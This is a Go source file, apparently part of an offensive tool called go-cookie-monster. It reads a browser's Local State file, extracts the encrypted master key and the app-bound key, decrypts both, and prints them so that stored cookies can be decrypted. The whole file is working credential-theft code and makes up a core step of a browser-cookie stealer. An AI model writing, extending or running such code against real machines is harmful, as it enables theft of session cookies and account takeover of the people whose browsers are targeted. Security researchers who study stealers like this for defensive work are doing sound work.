package cookiemonster

import (
	"fmt"
	"go-cookie-monster/pkg/keys"
	"log"
	"os"
)

func ProcessKeysMode(localStateFilePath string) string {
	var err error

	// If Local State file path is not provided, build it
	if localStateFilePath == "" {
		localStateFilePath, err = BuildLocalStatePath()
		if err != nil {
			log.Fatalf("Error building Local State path: %v", err)
		}
	}

	// Read the Local State file
	fmt.Printf("[*] Attempting to read Local State file: \"%s\"\n", localStateFilePath)
	content, err := os.ReadFile(localStateFilePath)
	if err != nil {
		log.Fatalf("Error reading file: %v", err)
	}
	fmt.Printf("[+] Read %d bytes from file %s\n", len(content), localStateFilePath)

	// Get the master key
	fmt.Println("\n[*] Attempting to extract master key...")
	masterKey, err := fetchMasterKey(content)
	if err != nil {
		log.Printf("Error fetching master key: %v", err)
	}
	fmt.Printf("[+] Master Key: %s\n", masterKey)

	// Get the app-bound key
	fmt.Println("\n[*] Attempting to extract app-bound key...")
	decryptedAppBoundKey, err := fetchAppBoundKey(content)
	if err != nil {
		log.Printf("Error fetching app-bound key: %v", err)
	} else {
		//printAppBoundKey(decryptedAppBoundKey)
		fmt.Printf("[+] App-Bound Key: %s\n", decryptedAppBoundKey)
	}

	// Return the better key
	if decryptedAppBoundKey == "" {
		fmt.Printf("[+] returning Master Key: %s\n", masterKey)
		return masterKey
	} else {
		return decryptedAppBoundKey
	}
}

// fetchMasterKey fetches the master key from the Local State file
func fetchMasterKey(content []byte) (string, error) {
	// Pattern to search for
	pattern := `"encrypted_key":"`

	// Extract the key
	key, err := keys.ExtractKey(content, pattern)
	if err != nil {
		return "", fmt.Errorf("error extracting key: %v", err)
	}
	//fmt.Printf("Extracted Key: %s\n", key)

	decryptedKey, err := keys.GetMasterKey(key)
	if err != nil {
		return "", fmt.Errorf("error decrypting master key: %v", err)
	}

	return decryptedKey, nil
}

// fetchAppBoundKey fetches the app-bound key from the Local State file
func fetchAppBoundKey(content []byte) (string, error) {
	pattern := `"app_bound_encrypted_key":"`

	// Extract the key
	appKey, err := keys.ExtractKey(content, pattern)
	if err != nil {
		return "", fmt.Errorf("error extracting app key: %v", err)
	}

	// fmt.Printf("Extracted App Key: %s\n", appKey)

	decryptedAppBoundKey, err := keys.GetAppBoundKey(appKey)
	if err != nil {
		return "", fmt.Errorf("error decrypting app-bound key: %v", err)
	}

	return decryptedAppBoundKey, nil
}
